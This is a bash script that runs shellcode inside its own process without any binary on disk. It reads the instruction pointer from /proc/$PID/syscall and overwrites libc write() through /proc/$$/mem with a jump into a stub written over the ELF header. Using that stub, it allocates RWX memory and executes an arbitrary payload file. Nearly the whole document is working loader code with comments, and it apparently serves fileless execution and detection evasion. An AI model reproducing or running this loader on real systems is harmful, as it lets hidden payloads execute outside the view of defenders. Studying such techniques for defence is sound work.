#!/bin/bash

PID=$$

mkfifo /tmp/z 2>/dev/null
# fork off
(
   # /proc/pid/syscall contains the registers of the process (note: the parent, not the child)
   # since this is happening while the parent is spinning trying to read the FIFO
   # the program counter will always reliably land in the middle of libc write()
   # which means we have a stable and minimal error-prone way of getting back to the RIP
   cat /proc/$PID/syscall > /tmp/regs

   # unhang parent
   :</tmp/z
) &

# begin to write to FIFO. this will hang
:>/tmp/z

# after the return of the above line we can know the address of libc write()
regs=$(</tmp/regs)
rip=${regs##* }
echo "RIP: $rip"

# parse maps for the address of the ELF header. we write to the header because its location will always be known
# and during runtime it will never be used
maps=$(cat /proc/$$/maps | grep r-xp | head -n1)
base=${maps%%-*}

# big endian <-> little endian
swaps(){
   fold -w2 | tac | tr -d "\n"
}

seek(){
   dd of=/proc/$$/mem conv=notrunc seek=$(( $1 )) bs=1 status=none
}
skip(){
   dd if=/proc/$$/mem skip=$(($1)) count=$(($2)) bs=1 status=none
}

inject_rip(){
   # back up original libc write() to a specific spot inside the ELF header
   :> /tmp/x
   orig=$(skip "$rip" 25 | xxd -p)

   # inject magic pointers into the shellcode, write it to a spot inside the ELF header
   echo "$1" \
   | sed "s/ffffffffffff/$(echo "$rip" | swaps)/g" \
   | sed "s/cccccccccccccccc/$(echo "$base" | swaps)0000/g" \
   | sed "s/706c616365746f7075747468656f726967696e616c73686868/$orig/g" \
   | xxd -p -r \
   | seek "0x$base"

   # mov r10, 0x$base
   asm="48b8$(echo "$base" | swaps)0000"
   # call r10
   asm+="ffd0"

   # replace libc write() with a call to the function we just wrote inside the ELF header
   echo -en "$asm"\
   | xxd -r -p\
   | seek "$rip"
}

run_shellcode(){
   # allocate RWX memory for the shellcode
   inject_rip "$(<obj/malloc.bin)"

   # make bash call libc write(), triggering malloc
   :>/

   # find the pointer to the memory we just allocated
   rawptr=$(skip "$(( 0x$base ))" 8 | xxd -p | swaps)
   ptr=$(printf "%08x" "$(( 0x$rawptr ))")

   # write the payload into the RWX allocation
   echo "$1" | xxd -p -r | seek "0x$ptr" 

   # shellcode to execute the payload with the call instruction
   inject_rip "$(sed "s/aaaaaaaaaaaaaaaa/$(echo "$ptr" | swaps)0000/g" < obj/exec.bin)"

   # another libc write(), triggering the payload inside $1
   :>/
}


run_shellcode "$(<obj/payload.bin)"
echo "safely returned to bash"
